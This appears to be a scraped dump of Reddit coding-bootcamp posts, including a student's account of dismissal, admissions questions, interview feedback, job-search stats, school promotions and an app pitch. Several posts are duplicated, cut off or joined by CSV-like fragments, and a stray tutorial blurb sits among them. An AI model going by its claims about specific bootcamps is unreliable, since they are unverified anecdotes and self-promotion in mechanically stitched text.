The next chapter of social drama started post Technical Assessment (TA). My result was inconclusive. I technically didn't pass, but my performance was splintered, so they gave me the PIP. I busted my ass over the next few weeks working to complete the PIP requirements on top of the capstone projects we were getting into. My Tech Mentor continued to hate it when I asked for help and the Cohort Lead also reprimanded me for not asking questions that were ""beneficial enough to the group"", again with no advice on how to change this other than to ""think more"". 

One day, my Tech Mentor blew up at me for sending him a Slack message on a Saturday. We were never told this wasn't allowed and it was almost a full day of classes. He told me that I ""should have known, and need to stop doing things at the last minute"" and that he works ""normal"" hours. He then proceeded to take 5 days to actually respond to my inquiry which caused me to miss a PIP deadline. I got an extension, but only under the condition that I not ask the Tech Mentor for any assistance the day before the new due date. I ended up needing some help, but was not allowed to ask for it when I needed it. I also got told that I ""just needed to have an eye for what was being asked for"" and not misinterpret vague and contradictory directions.

During all of this, I joined the Telegraph Track, which is a big smorgasbord for all kinds of marginalized groups and asked the person running it for resources and advice related to being neurodivergent and in a bootcamp. This person was generally rather unresponsive and only sent really generic stuff like Web MD pages with symptom checklists for autism and ADHD, while also later deleting some of what I wrote in the general Slack channel for that specific workspace without explaining why. It was here that I was able to get in touch with other students and find out about their stories.

I also went back to the Accommodations Team to try and beef up my accommodations. Like before, they gave me the 50% extended testing time without any issue, but everything else was a struggle and half-assed. They demanded more documentation after I had already submitted a nearly 20-page neuropsychological report.

I found out that a Deaf student had to drop due to an interpreter and closed-captioning not being provided and so much of the curriculum being spoken. I also found out about other neurodivergent students having to switch to part-time or retake the first half (for another half tuition) en masse, as well as cohort staff providing official accommodations rather begrudgingly. 

On my final day, I was called into an office hour with my Tech Mentor and told that I ""shouldn't need someone over my shoulder this much"" and that I seem to learn better when I get more office hours and ""need to learn to apply that to the rest of the program"". I was then told that he ""had some thoughts"" and was off to speak to the Cohort and Program Leads about how to best address the situation and would get back to me by the end of that day. 

Not even 10 minutes later, I got pulled into a meeting with my Tech Mentor and Cohort Lead and told that they ""needed to initiate a separation from the program"" after several minutes of euphemistic and passive-aggressive discussion about ""how I felt about my progress"", reminders to ""see failure as an opportunity for growth"", sprinkled with blame over ""signing the PIP knowing the risks"". I had an impending sense that there was a bandaid they were stalling ripping off.

They left me with no recommendations besides really generic stuff like Udacity and immediately revoked my access to all of the portals and materials and I was told that I was being ""sent to the separations team for separation processing"". I was a few weeks shy of being assigned a Telegraph Mentor as well.

That day, I emailed the Program Lead explaining what happened to me and asked to either have a full refund, be reinstated, or moved to a part-time cohort at no additional cost, as well as asking who to talk to if it were someone higher up. This message was completely ignored. I also filled out a formal complaint form. The last I've heard is that it ""will be investigated in the next 14 business days"". This same person I sent the complaint form to quickly sent a 1/3 refund back where it came from with a receipt. My psychologist wanted to add his two cents to the complaint evidence submitted but was told that it was not allowed for him to talk to anybody there about me.

The family friend who initially recommended the program glowingly is getting in touch with his own connections to let them know how it went for me and saying he will never recommend this program ever again to anybody.

**The End**

There it is folks. I wanted to put this out there because when I was looking at reviews on different bootcamps, I couldn't find any regarding students coming in with a situation like mine and think it will help others make an informed decision.

Hello,

I am seeking the best coding Bootcamp out there that will help me land a job after. I do not mind loaning a big amount if it's all worth it down the road. I really aim for financial stability as I was a housewife for a long time and then started working a few years ago and that is the main reason why I graduated from CS but shamefully can not code. My contract is about to end as a technical recruiter for a tech company in San Francisco. It is something I truly enjoy but will not pay as much as SDE. I do work remotely as I am in Texas.

I feel like if I want to venture into software engineering now is the time to do so or will regret it further down the road if I have not tried taking it seriously.

codingbootcamp,"Hi Everyone

I would say I fit the character for coding, problem solver, high attention to detail, enjoy working with computers. I've previously left a successful career which I wasn't finding forfilling and in search of something new. Im 34, education is degree level. I'm not chasing the salary that's thrown around with coding, but the flexibility of remote working is so appealing.

Rather than self learning and then applying for junior coder role I have been looking for ""no experiance"" apprenticeship roles as I know that's my preference for learning, but have found them extremely limited (made worse by living in a rural area).

The only apprenticeship role I have found is created by Makers that offered free enrolement into their next cohort (if I qualified) and employment with ""someone"". I signed up and have 10 days to complete learning Ruby course on codeacademy then an exam. Makers have described Ruby as one of the easiest to learn first?

I'm 5/6 hours in (over 2 days /25% complete) and feel I'm struggling already to comprehend/remember some of the processes. I don't want to give up, I'm more frustrated that exhausted that I can't actively speak to a teacher.

Are my struggles ""normal"" and have others struggled when they first got into coding? 

Im presuming going straight into any bootcamp right now will largly be a waste of my money.

codingbootcamp,"Hey everyone, 
I've been an actor in LA for years and had a fair amount of success. However, at this point in life I'm not where I'd hoped I'd be. Along the way to support my acting, I worked many jobs including, background actor, personal trainer, bartender and small business owner. I am currently working as a bartender and still running my small business, but when covid came, both those were heavily impacted along with TV and film production being shut down. All that to say, all my endeavors for the most part were failing me.

I have a Bachelor's but never put it to use professionally. With the time I was laid off and not auditioning or booking work, I took the time to do the Google Data Analytics Specialization through Coursera and completed it in 38 weeks. No luck finding any work doing that, but I did enjoy the R Programming part of the course which ultimately brought me to coding.

A friend of a friend got into Codesmith and ended up getting a position with Disney, so I was highly motivated and started looking at bootcamps, namely Codesmith. I enjoy learning already and discovered that I REALLY enjoyed learning coding over these last 3 months, and committed myself to making that my career path.

I am seeing from everywhere that Codesmith makes it really hard to get into their program. I've already done 2 of their courses, JavaScript for Beginners and CS Prep, and I am still feeling unprepared and terrified out of my mind of taking their TA. I feel like I've learned so much, but still know so little. 

Today I took the TAA for Hack Reactor and got 3 or 4 in and I didn't panic, but kept trying to figure it out but ultimately had to ask to move on to the next one because maybe I didn't fully understand the prompt or was just confused. Ultimately I don't think I succeeded. I took the TAA with Hack Reactor because I decided to open up the possibilities for me to get into a good bootcamp outside of Codesmith, because I dont think I could ever get in. Especially after todays disaster. I also applied to Fullstack Academy and got in with just doing a written assessment test online and no TA required. Should I be concerned with the quality of Fullstack since they did not require a TA like Codesmith and Hack Reactor? Truth be told, I may end up at Fullstack because I'm not the best test taker, but I feel like I've learned so much over the last 3 months then I get a proctored Zoom test and go blank. 
I'm kind of just venting now, sorry, but this is really the career path I want and I am trying everything to make it happen, but I desire the structure of a bootcamp. I want to be a frontend developer, and am enrolled in Meta's frontend specialization through coursera, and also purchased Colt Steels Udemy course, so I'm in it. I guess I'm just at a low moment right now. Any advice on anything I've said? Any Fullstack grads out there? How was the part-time course? Was it challenging to get a well-paying job in the end?

codingbootcamp,"Like the title says, I graduated CodeSmith on July 2022, and just signed an offer for a six figure amount this past week. 

Some Background:

I had been bouncing around different career paths for several years in my 20s. I initially went into Physical Therapy but had no luck there, then entered into Logistics, but was unable to really find a footing/stability in the field. Ultimately I quit my full time logistics position last year to enter Nursing as I really enjoyed the medical field and spent about a year being an EMT to prepare for that, however, Covid really killed my drive and seeing people pass away on a week to week basis destroyed most of my conviction. 

Finally around January 2022 I decided to enter full time into software engineering and was accepted into CodeSmith around April of this year. I finished the program in July and immediately began applying the moment I graduated, after about two and a half months of hardcore applications and studying, I received an offer. Some people have asked me how I'm feeling, and honestly it's probably relief, I was running on fumes emotionally and just finally receiving an offer that I actually liked was incredibly relieving...

Some Stats:

- Applications Submitted: 151
- Easy Applies: 39
- Hired Inbounds: 3
- Total Apps/Hired: 193
- Inbounds (Phone Screenings): 15
- Offers: 1

Next Steps:

I signed my offer this past week, so I'm awaiting to finish background checks and references, but I see no issue with that, like I said in the title I do not have a Bachelor's and saw yes there were some opportunities that I did not receive because of that, but I had about a 13% inbound rate which seems to be an average amount from what I was reading. I start in Oct so I will most likely be trying to finish my degree online while I work. 

Ultimately, I hope I'm not being show offey with this AMA but rather I just wanted to give back to this subreddit as the numerous other AMAs about CodeSmith and bootcamps were so helpful in me choosing this route.

codingbootcamp,"I got the below wall of text as  feedback.  


I got into all the bootcamps i applied to other than this. I think they have a higher bar I guess or are looking for something specific.  


The last question that left me dumbfounded was they wanted me to count the length of an array without using any native js method or loops.  


So my go to thought was recursion but to reduce the input, i would have needed some method. so that's where I got stuck.  


Do people usually get into them in their first interview?  


    Thank you for taking some time to chat with our team. I wanted to follow up with the specific feedback that was discussed from your technical interview.
    
    Areas of Strength:
    - Analytical Skill - Amazing job parsing through the prompt and expected output to fully understand the question. You did a great job at grabbing the important information out of the prompt and using it in your solution.
    
    -JS Fundamentals - You demonstrated a really solid understanding of a number of native JS functions and fundamentals, whether you were tackling array methods or complicated callback implementations.
    
    Areas for improvement:
    -Technical Communication - While you effectively communicated your approach, there were a number of times, especially upon hitting errors, that you became very quiet, so I couldn't tell where you were stuck. Practicing pair programming a little more will help you with that!
    
    - Pseudo code is an important tool, try using it a little more in your solutions. It can be useful in a number of ways. It will help you practice your technical communication as you write out and explain the steps and strategies to solve the challenge. Another strength of pseudo code is that it can help you stay on track when you are trying to solve more complex algorithms.
    
    - Debug strategy - While you managed to debug the majority of your problems I'd highly recommend learning some tried and tested debug strategies to help you track down issues faster. This will only serve you later in your engineering career.

Please be aware of the technical interview deadline for your desired cohort.",Update on me waiting for a call from the codesmith folks: They asked me to schedule a second interview,"I got the below wall of text as  feedback.  


I got into all the bootcamps i applied to other than this. I think they have a higher bar I guess or are looking for something specific.  


The last question that left me dumbfounded was they wanted me to count the length of an array without using any native js method or loops.  


So my go to thought was recursion but to reduce the input, i would have needed some method. so that's where I got stuck.  


Do people usually get into them in their first interview?  


    Thank you for taking some time to chat with our team. I wanted to follow up with the specific feedback that was discussed from your technical interview.
    
    Areas of Strength:
    - Analytical Skill - Amazing job parsing through the prompt and expected output to fully understand the question. You did a great job at grabbing the important information out of the prompt and using it in your solution.
    
    -JS Fundamentals - You demonstrated a really solid understanding of a number of native JS functions and fundamentals, whether you were tackling array methods or complicated callback implementations.
    
    Areas for improvement:
    -Technical Communication - While you effectively communicated your approach, there were a number of times, especially upon hitting errors, that you became very quiet, so I couldn't tell where you were stuck. Practicing pair programming a little more will help you with that!

I wasn't sure how they'd be able to verify that given that it says 'self-identify' but it does require you to have a LinkedIn account with a profile picture to enroll so I guess that's something although I still don't see how that prevents people from lying.  What really made me want to try it out was it being free (obviously) but also that there doesn't appear to be a set schedule where you have to meet at certain times on certain days for several hours as that just doesn't work for me or a lot of people who either work full time or just have other obligations that don't make that possible.  They do also have a LinkedIn, Facebook, and YouTube channel which seem to get posted to somewhat regularly.  The most I've found for reviews or experiences is on their LinkedIn which is still somewhat scarce.  It definitely seems worth a try if you qualify and don't want to spend thousands on some other bootcamp.

Hello , Today in this blog you’ll learn how to create Drag &amp; Drop List using HTML CSS &amp; JavaScript. 

**Drag and drop** is a marking device gesture in which the user selects a virtual thing by “grabbing” it and dragging it to a separate area or onto another virtual thing. **Sortable JS** is a Javascript library that lets you sort or reorder lists by dragging and dropping list items.

In this program \[Drag &amp; Drop List or Draggable List\], there are five lists or cards on the webpage and these are draggable items or lists. Users can easily reorder the items in an underorder list, giving users a visual dimension to particular actions and modifications.

to make an item draggable I used the JavaScript SortableJS library, so there are no vast codes for JavaScript.

codingbootcamp,"I applied for Springboard because I hear Colt Steeles name thrown around in reddit all the time so figured it would be a decent place to get a coding job. I submitted the application that just had a bunch of questions about my background and what I want to get into. A little bit later I got a response saying that they would want to call me for an interview and to take a technical assessment. I didn't pick up the call because I wasnt fully sure about the bootcamp. Nonetheless I tried out the technical assessment and answered 2/4 questions and stopped because I just got lazy and again I wasnt very onboard with the program despite applying. So I closed down my browser and let the time run out. Hours later I get an email and text saying ""Congratulations on your acceptance on the Software Engineering track"". The email was a bit more descriptive saying that I should go to their ""Foundations to Core"" path first which seems to be the basics before the meat of the program so I'm wondering if they just send these acceptance letters to anybody? 

I'm kind of intrigued now so I maybe want to add another discussion as to whether or not Springboard is good? I was about to enroll into Actualize coding bootcamp, but they teach Vue which is not bad per se, but I want to learn technologies that everyone says is more in demand like React.

From what I read around the subreddit, I heard the program is self paced and solo work where you learn through their lessons with no one else (no classmates) and then you have a mentor to help you along the way. Why does Springboard mention that there are cohorts on certain dates if we're we just learning on our own. If the solo learning is true, I think I'd prefer that more since I have some experience with self teaching coding.

Is there anyway for someone who is transitioning careers (from a business background) to go to one of these two bootcamps and graduate and realistically expect to see an initial salary over 120k or is that wishful thinking?

codingbootcamp,"Hello. It's Ivy from PE (you know, that intimate web developer boot camp for people who want to learn to design and build web applications)

I know there are a lot of people around here trying to choose a school, and I'm the one who will have to deal with people that don't find out about us for 2 more weeks and are then sad that there are no sessions again for three more months, so, I'm posting this here. We have a few spots left right now.

There are a bunch of really great schools out there! So, how is PE different? Who is PE for? 

PE might be is good fit for you if you want:

* to learn part-time / (might have a job/obligations)
* to have a daily drip of bite-sized (and fun) lessons
* to make your own daily work schedule - but with accountability each day
* to learn way more than surface-level HTML, CSS, and JS
* to learn enough visual design to connect all the dots and enjoy it
* to enter the field with a lot of real-world experience
* to have an impressive portfolio of work
* to have room to decide what roles to specialize in and custom support
* to learn some UX and UI in a holistic way
* to feel a deep level of confidence with your decision making
* to have access the teacher _all the time_ (who wrote the curriculum)
* to have career guidance and coaching from day one
* to pick up any new hot library or framework quickly because you have a solid foundational knowledge of the reasons those things exist - and you've made them yourself

It's a reverse-engineered learning path that breaks it up into the most fun and digestible pieces possible. 2-4 hours a day. No sitting on zoom calls watching a teacher talk. Instead, you can read/watch the lesson, and the teacher can save that time for much more personal attention.

we also just keep adding tons of new extra resources, and yeah yeah yeah - you can read it on [the website](https://perpetual.education).

https://perpetual.education

You can [book a time to talk to ME (and probably Derek) any time](https://calendly.com/perpetual-education/priority-meeting). I'm a real person. Not a salesperson. So, you'll just get real honest human info about what we offer and if it's a good fit for your learning style. If another school is a better fit, we'll tell you about it!

Is it better to go for a JavaScript focused bootcamp instead? Any help would be greatly appreciated!

After 8 months of applying and building a full stack ASP.NET MVC application with full CRUD functionality and hosting it on Microsoft Azure I was able to catch recruiters attention.

2nd job —— I got a software engineering job at a major distribution center that was remote. I got paid $68k salary. After 7 months I quit and got a new job for higher pay.

I don't want to end up working an IT help desk for example. I'm interested in cyber security and software development, but open to other paths as well.

codingbootcamp,"Hey guys I am halfway through A/A's 16 week in person bootcamp and I want to give a general overview of the course and my experience's, this won't be in much detail, if you have specific comments please drop your questions below or DM me.

1. Test experience : So basically I failed rails 1, and just passed rails 2. So if you fail a test early you aren't totally fucked for the next test. As for other students in the class, two students are currently retaking rails 2 to be able to stay in the class. Your first fail is NP, your second fail requires you to retake it that day and you have to pass to stay in the class. The tests are not impossible, but I dedicated basically the entire previous week to studying for this test. My biggest take away that it is truly impossibly to cram. If any tests require memorization, and a lot do... if you go into the weekend not already having the memorization down your fucked, basically that simple
2. TA experience : Extremely Hit/Miss, unfortunately like most bootcamps  there's 1 real instructor and 2 ""helpers"" who are called ta's but are too inexperienced imo to be called TA's. Basically you ping a question on A/A's app (like a queue), and when its your turn they will come over to help you. Unfortunately the help you get is hit or miss based on who comes over to help you. But in their defense, they are all over worked/under paid, and unlimited questions to attend to after they get to you lol. On some days it can take up to 30min for a TA to come assist you, which by that point you probably figured it out 
3. Is in person worth it : In my opinion 100% yes, it's awesome being able to ask the person sitting next to you if they got up to this point in days project, and I actually feel like I have learned more from teaching/being taught by my fellow peers. The first 2 weeks are remote and dropping into random break out rooms is not the same vibe. Also I have a kid at home... so getting out of the house is amazing.

We're almost half way through, we're currently doing the second project which is chaotic because none of my teammates know what to do and we're a group of 6 people and I feel like I have to do the majority of the work because they're all lost. 

I made a post about my experience 3 months into Trilogy's bootcamp in an unbias way if you'd like to read, but at this point that post is pretty inaccurate now with my current experience.. [https://www.reddit.com/r/codingbootcamp/comments/wtbzn2/my\_experience\_with\_trilogy\_bootcamp\_so\_far\_3/](https://www.reddit.com/r/codingbootcamp/comments/wtbzn2/my_experience_with_trilogy_bootcamp_so_far_3/)

For context, the project we're doing requires a ton of backend stuff like SQL, Node, Express, Handlebars, ORM, Authentication, custom-made get, push, delete APIs, and a bunch of other crap. I'm using Traversy Media's Express video as a template but I feel like just taking an L and dropping out and just paying the remaining 2k dollars of the tuition and letting my team mates on their own.

A few weeks ago almost half way through the course, I found out that all of the curriculum and material that we are learning was leaked in 2019 and has barely changed at all, and in some cases, it has been downgraded because the 2019 material was a lot more documented than what we were given in 2022. So I feel like I was completely ripped off because the tuition costs around 12k and so we paid that much money for content that was already leaked years ago and has barely been updated that I could've studied in my own free time instead of going with the class's unrealistically extreme fast pace.

And also, we won't even put in the bootcamp in our resume because that'll affect our hiring chances because employers have a stigma about code camps so everyone will omit that anyways. What interviewers will ask is to see any Github work or projects, but the problem is the class is so chaotic that people barely know what's going on and that leads to one of the member (me in this case) has to do most of the workload for the group. This is unrealistic because the project requires many people to work on it, but we're only given 4 days to work on it in a class of 3 hours total. 

I explained to my TA the situation and so far he hasn't responded for 5 days. Don't know if I said something that may have offended him or something but I'm confident I haven't because it's related to the bootcamp itself and not the TA or instructor's teachings. They're both doing the best they can to teach us but something needs to be done about Trilogy so that they stop ripping people off on free content that they never bothered updating, or at least rewrite their coursework so it's more up to date.

codingbootcamp," Holy Moses. I almost forgot to post this week because I have spent so many hours studying. I am truly braindead at this point haha. If you want to know more about my background and this journey I'm taking, please see my previous posts! 

This week we dove even deeper into Django along with some additional HTML and CSS. We're getting closer and closer to the end of our first module. We will have a final project due on the 16th this month and a final assessment on the 19th. The project will be fullstack incorporating what we've learned from Django, Python, CSS and HTML. It's not going to be crazy elaborate, but it's going to definitely be a lot of work. 

This week we had only about a quarter of the lectures we've had the previous two weeks. Mostly worked on projects and had time to ask questions about certain debugging issues, etc. The lectures we did have were really helpful about trimming down our Django models, functions, and templates. 

Many of us in the class are very active together in a discord server so we also worked together on some of the projects and studied together all through the long weekend. I studied an average of about 8 hours a day over Labor Day weekend. You don't have to study that much, but I just had so much that I wanted to practice and work through again to solidify what I've learned.

I'm still really enjoying myself and loving the program. I'm just really tired haha.

codingbootcamp,"Hey everyone,

Some background about myself. Worked 5 years in digital marketing, currently a marketing project manager at a gaming company working on product launches. 

A couple months ago multiple events at work triggered me to think about my career and what I want to do for the rest of my life. I made the decision to look into programming/software engineering, something I’ve always had an interest in. I took some web dev/python classes on udemy and felt comfortable as well. I plan on attending General Assembly’s SEI 12 week bootcamp in a couple months, which I’m really excited for, however also scared at the same time.

I guess I am more so scared that I’ll be quitting my job, wont be working for a few months (maybe even year), scared for the journey ahead. Reading success stories on reddit or youtube definitely help motivate me. I’m writing this post on reddit just to see if there are others out there that have been through similar situations and can share their story. Whether it’s success or failure, I’d love to hear more about it and why you feel it happened. 

I’ve reached out to many people on LinkedIn that graduated from GA’s bootcamp and are currently Software Engineers. Most, if not all of them had zero engineering background which I find impressive. I also got a lot of feedback telling me to do Codewars, Leetcode everyday, and to also start applying to jobs 2 months into bootcamp. So another reason for this post would be to open the discussion up to any advice you guys have to give someone in my position. 

Nonetheless, looking forward to the bootcamp and my future career i suppose. I didn’t try too hard to write this all out, so apologies for the grammatical errors.

Thanks in advance for sharing!",Starting bootcamp soon. Feeling scared.,"Hey everyone,

Some background about myself. Worked 5 years in digital marketing, currently a marketing project manager at a gaming company working on product launches. 

A couple months ago multiple events at work triggered me to think about my career and what I want to do for the rest of my life. I made the decision to look into programming/software engineering, something I’ve always had an interest in. I took some web dev/python classes on udemy and felt comfortable as well. I plan on attending General Assembly’s SEI 12 week bootcamp in a couple months, which I’m really excited for, however also scared at the same time.

I guess I am more so scared that I’ll be quitting my job, wont be working for a few months (maybe even year), scared for the journey ahead. Reading success stories on reddit or youtube definitely help motivate me. I’m writing this post on reddit just to see if there are others out there that have been through similar situations and can share their story. Whether it’s success or failure, I’d love to hear more about it and why you feel it happened. 

I’ve reached out to many people on LinkedIn that graduated from GA’s bootcamp and are currently Software Engineers. Most, if not all of them had zero engineering background which I find impressive. I also got a lot of feedback telling me to do Codewars, Leetcode everyday, and to also start applying to jobs 2 months into bootcamp. So another reason for this post would be to open the discussion up to any advice you guys have to give someone in my position. 

Nonetheless, looking forward to the bootcamp and my future career i suppose. I didn’t try too hard to write this all out, so apologies for the grammatical errors.

codingbootcamp,"Hello! 

Can someone suggest a program or tutorial that is hands on for a person with zero coding expertise to see if it’s something I’d overall enjoy?

codingbootcamp,"Hi, I'm looking into a bootcamp that will have ruby on rails in its tech stack. I've read that it's nicer to use macOS for the technologies we will learn and the bootcamp also recommends to learn on a macOS. That being said, I don't own a apple computer. I was thinking of buying a new MacBook just to own one but I figured in the grand scheme of things, I can rent one during my time in the bootcamp and the time it would take to land a job and then eventually hope that a company provides their own equipment. 

If it is a remote company sending equipment, that'll be the best case scenario as I'll have something to still learn from at home, if it's a in person company, I'm assuming there isn't equipment that you can just take home so that would possibly mean I can't study at home? 

So my dilemma here is whether or not to rent or straight up own a computer for my career outlook.",Should you rent or own a laptop during and after a bootcamp up until you land a job in hopes they provide a laptop for IT/security purposes?,"Hi, I'm looking into a bootcamp that will have ruby on rails in its tech stack.

codingbootcamp,"Hi all! I am enrolling in the September cohort of Perpetual Education’s Design for The Web program. 

Please see below for an introduction and some context on why I chose DFTW at the EOD. Hopefully, this can help provide some helpful information for anyone with a similar background/goals. 

**Who**:

Late 30s father of 2 &lt;10 with \~15 years managing a mix of:

* website CMSs (selection, implementation, training and ongoing maintenance)
* paid search 
* paid/organic social media
* landing page design
* analytics (maintenance and ongoing reporting) 
* SEO 
* Local SEO (optimizing offsite directories, yada yada)
* with the above channels, leads-focused campaigns that measure engagement and improve over time against central goals 

… on behalf of clients at agencies or in-house as a digital strategist. 

**Why**:

In my experience, roles in digital marketing / digital strategy have become primarily focused on placed on platforms that aren’t owned (social channels, directory/ranking sites). For someone who loves creating a unique digital product to represent a client, web development offers a “blank slate” to build and design with. I am growing tired of managing paid campaigns and focusing more on off-site properties that don’t foster much creativity (i.e., choosing different ways to use user’s data on FB to benefit a client). 

I want to gain a very deep and holistic understanding of how everything connects in web development… here’s why: 

* This is mostly fueled by a lifetime love of technology (first discovered on a Macintosh SE in the early 90s). 
* *Also:* working in digital marketing has allowed me to stay up-to-date in web design and development, and that has strengthened my interest in the field. 

My current interests align with the responsibilities of front-end designers/developers, but I acknowledge that the curriculum covers the full stack. Who knows, maybe I’ll fall in love with something further back in the …stack? 

**How**: 

I started the **Professional Certificate in Coding: Full Stack Development with MERN** in 2021 and was horrified by how poorly it was executed. Within the first 2 weeks, it was clear the program was a less organized method of quickly entering tutorial hell without support. If you’re interested in this program, PLEASE do a search and look at the critical reviews. They might have made some improvements, but it looks like some recent cohorts are reporting similar experiences. 

After researching coding bootcamps/front-end design programs for years at that point, I honestly didn’t think there was one that wasn’t solely focused on bringing in tuition dollars. That changed after I stumbled into a few posts that mentioned Perpetual Education’s Design for The Web mentorship. I binged on a few videos from the website and their YT channel, and quickly found that their approach aligns perfectly with my background (from the “who” section above) and goals (from the “why” section above). 

After a recent conversation with Derek, I found myself more excited to gain a broad understanding of the web dev field, while focusing on an area that I love dearly in design. With PE’s mentorship and community of other learners that are similarly focused on building beautifully representative digital experiences for clients, I’ll be WAY better off with their curricular delivery as a full-timer (1 core concept a day, 6x a week, along with real-life client work and building a portfolio/).

**What next?**: 

I’ll keep ya posted here! Very excited for to join this September cohort, and wanted to share The who/why/how.

codingbootcamp,"Hi guys, I have been accepted into two different bootcamps. I am in Minneapolis, MN for reference and have a bachelors in biochemistry. I've been accepted into Prime Digital Academy, a 20 week full-time bootcamp that is in person, and Hackbright Academy, a 12 week full-time bootcamp that is online. I qualified for full tuition scholarships for both so I thankfully will not have to pay anything no matter my choice. I'm really grateful for this!! Both bootcamps will be starting in September.

For reference, I've been using The Odin Project for the last 7 months so I would say I have pretty decent skills in HTML, CSS, and Java/JavaScript. Prime is a longer course, so I think I'll be able to learn a lot more new material. What makes me question this is I don't want to waste time when I could already be working since Hackbright is a shorter program. Hackbright is teaming up with Target for my cohort, so I'll have the opportunity to interview with Target before the course is over if I work hard enough. The problem with this is I don't know if 12 weeks is enough to learn new stuff, they're going to spend the first couple weeks going over stuff I already know how to do. I personally know alumni from both programs that say great things about each program and have been successful in launching their careers as software engineers.

codingbootcamp,"If you want to know more about my background and this journey I'm taking, please see my previous posts!   
Well this was a crazy busy week. We are breaking for a moment from Python and covered HTML, CSS, and Django. To say that my brain is overloaded would be an understatement haha.  


I was mostly afraid of Django in this course, but the projects they have us doing as practice have been incredibly helpful and I really feel very comfortable with Django. HTML was a breeze, as expected. CSS was a little more challenging than I expect and I am doing more self study to sharpen my skills.

What is absolutely incredible is that at this point our class is able to build (very very very simple) full stack projects. I really never thought I'd be able to learn so much so quickly and actually be able to apply it. My partner is a traditional Computer Science grad who is a full stack engineer currently and he said that we are operating at at least yr 2 levels when comparing to his college experience.   


My biggest complaint last week was a lack of hands on project time. We did get more of that this week, but the lectures were still very long. If you do take this program expect to be strapped in for very long lectures the first couple of weeks. When I look ahead at the schedule there are far few long lectures later on, but my gosh for now it hurts my brain. The biggest tip I have for surviving the long lectures is to (even if you don't have a stand/sit desk) to get up and move every once in a while to refocus and not fall asleep. We had a few people doze off this week haha.   


My biggest compliment this week is that the practice projects we were assigned for all the new things we've learned have been crazy helpful in solidifying my personal knowledge of what has been taught. My biggest complaint is once again so much lecturing compared to hands on programming during class time. I spend a couple of hours a day outside of class getting homework done and practicing with projects.

I’m building an app and I need to learn how to code. In doing this sort of research I realized that not every class/curriculum would necessarily teach the skills that I need for this particular project. So in digging in I thought I would reach out and see if I lay out the parameters of the app and what I expect it to do, someone could point me in the right direction. That way I won't be wasting my time say on learning web development when the whole time I should have been knee deep in computer science. 

*Along the way I’m looking for a technical co founder but I understand that I need to be learning along the way in the expectation that I won’t be able to find one with little to no funding and I’ll need to bootstrap and do it myself.*   
I understand that this won't be easy and I’m not looking for shortcuts, just guidance around which coding bootcamp to join, which free courses to take (Youtube, etc) , and basically to maximize every second of my time. My plan is to eventually run into like minded people along the way, but I’m determined and dedicated to making this happen myself if that ever becomes a reality.

*The type of app I’m building* 

The app I’m building allows you to earn money when you play pickup sports like basketball, football, and soccer.   
The app awards you ½ credit per made shot…250 credits =$5.00. You can also take credits from other users by playing the 1v1 winner takes all. So If I had 245 credits I could go on the app and view a map (picture Uber) find another user and put 5 credits up in a game to 15. The winner would take the credits. If I win I have 250 credits, if I lose I'm back to 240. 

In total there are **7 different ways** to earn including the most monetizable feature of the app spectator mode

**Spectator Mode** 

Spectator mode allows anyone watching to take over a game and completely change how we view pickup sports. The main feature is a live action version on your phone of the game that’s taking place. Track players in real time while they playing keeping track of their **Steals, Points, Block shots, &amp; Turnovers**

Spectator mode is the game mode that rewards the most credits based on accuracy and solves the cheating problem of users inputting their own made up data at the end of matches. Spectator Mode also generates the most revenue as users will spend the most time on spectator mode keeping track of their friends, going live on various social media sites, and maximizing the average time that’s spent on the app (Average pickup games of basketball 17 minutes)

[https://imgur.com/a/nbpOduC](https://imgur.com/a/nbpOduC) &lt;&lt; Spectator Mode

**Quickplay**

Quickplay is the main function of the app and allows you to earn simply by playing basketball as normal.   
Before you start a game you simply select Basketball &gt;&gt; Quickplay &gt;&gt; 5on5 &amp; that’s it.

After the game you record the final score and enter how many shots you made. 1 shot = ½ credit

**Challenge Mode**

Challenge Mode let’s you take the credits that you earned in other game modes and put them up 1v1 against other users. Simply find a user on the app and put up an amount, meet and hoop, winner takes all.

**The Playbook**

The playbook lets you earn credits completing daily, weekly, and monthly tasks akin to mobile games and typical RPG’s that reward you based on accomplishments and consistency.

**Profile** 

The profile screen is where you’ll find your player rating. Everyone in the app will have a rating just like popular sports video games. You’ll be able to find a player and rate how good he is simply based on his rating

codingbootcamp,"Building out a pair programming platform to help bootcamp students better prepare for technical interviews. You collaboratively solve programming challenges with another peer, helping you get better at communicating your solution while you are problem solving. A skill I am finding to be very important in interviews.  


**How the platform works**

Users sign up to create a profile, start a pair programming session, get matched with a random peer, get access to a code editor, receive a programming challenge and start coding together over an audio call. Users will be able to peer program for free 3-5 times before being required to pay a monthly sub ($10-$15)

**Vision**

The vision is to become a platform focused on helping bootcamp students and self learners both learn and develop interview skills through peer to peer learning. This will go beyond pair programming to live group discussions focused on algorithms and data structures, all primarily focused on peers helping each other learn, become better collaborators and communicators.

**What has been done**

I have been building this out solo for the most part and almost done with the MVP.  What is left is building out the functionality to match users and redirect them to their respective sessions (I have conceptualized how this will work and have most of the code written out).

**Tech Stack**  
Backend: Django  
Cache: Redis  
Frontend: React  
Other: Docker  


Would love to pair program on this project if anyone's keen. Ultimately I am looking for people who will join me long term in this project. I fully intend to turn this into a side-hustle and potential startup depending on how things go.

  
Let me know if you are keen and we can start with a few pair sessions, see how well we work together and take it from there.",Looking for people to pair program with on a project,"Building out a pair programming platform to help bootcamp students better prepare for technical interviews.

I am currently looking into a bootcamp to take my learning a step above and get serious, the bootcamps that I have narrowed down are Hack-reactor, App Academy and Codesmith,  the reason why Hack reactor is number one for me is their 60k  ISA being offered in the part time 36 week program, App Academy seems good also as they also offer an ISA, however i have hear less that App Academy has a very strict and unforgiving curriculum, and you have dismissed if you fail 2 exams and fail 10 random attendance check ins, this just does not seem like the culture of a bootcamp and student relationship I would like to support or be a part of, CodeSmith looks to have the best curriculums  and  student satisfaction, however they do not offer a ISA, and is $20k, I would like to hear some recommendations on which camp would be the best, If codecamp is really worth taking out a private loan for?

I am currently looking into a bootcamp to take my learning a step above and get serious, the bootcamps that I have narrowed down are Hack-reactor, App Academy and Codesmith,  the reason why Hack reactor is number one for me is their 60k  ISA being offered in the part time 36 week program, App Academy seems good also as they also offer an ISA, however i have hear less that App Academy has a very strict and unforgiving curriculum, and you have dismissed if you fail 2 exams and fail 10 random attendance check ins, this just does not seem like the culture of a bootcamp and student relationship I would like to support or be a part of, CodeSmith looks to have the best curriculums  and  student satisfaction, however they do not offer a ISA, and is $20k, I would like to hear some recommendations on which camp would be the best, If codecamp is really worth taking out a private loan for?

codingbootcamp,"This is a question for codesmith alums and people in the program right now

